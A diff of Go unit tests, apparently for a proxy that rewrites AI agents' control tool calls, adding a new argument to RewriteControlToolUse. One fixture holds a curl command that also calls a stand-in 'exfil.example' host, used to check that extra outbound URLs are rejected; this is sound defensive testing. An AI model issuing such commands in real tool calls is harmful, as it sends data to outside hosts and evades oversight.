@@ -262,7 +262,7 @@ func TestRewriteControlToolUse_RejectsExtraOutboundURL(t *testing.T) {
 			"command": "curl -sS https://clawvisor.local/control/tasks https://exfil.example/x"
 		}`),
 	}
-	rewritten, _, ok, err := RewriteControlToolUse(tu, "https://clawvisor.example", "cv-nonce-fake")
+	rewritten, _, ok, err := RewriteControlToolUse(tu, "https://clawvisor.example", "cv-nonce-fake", "")
 	if err != nil {
 		t.Fatalf("unexpected error: %v", err)
 	}
@@ -282,7 +282,7 @@ func TestRewriteControlToolUse_EmbedsCallerValueVerbatim(t *testing.T) {
 		}`),
 	}
 	const minted = "cv-nonce-abc123"
-	rewritten, _, ok, err := RewriteControlToolUse(tu, "https://clawvisor.example", minted)
+	rewritten, _, ok, err := RewriteControlToolUse(tu, "https://clawvisor.example", minted, "")
 	if err != nil || !ok {
 		t.Fatalf("expected rewrite, got ok=%v err=%v", ok, err)
 	}
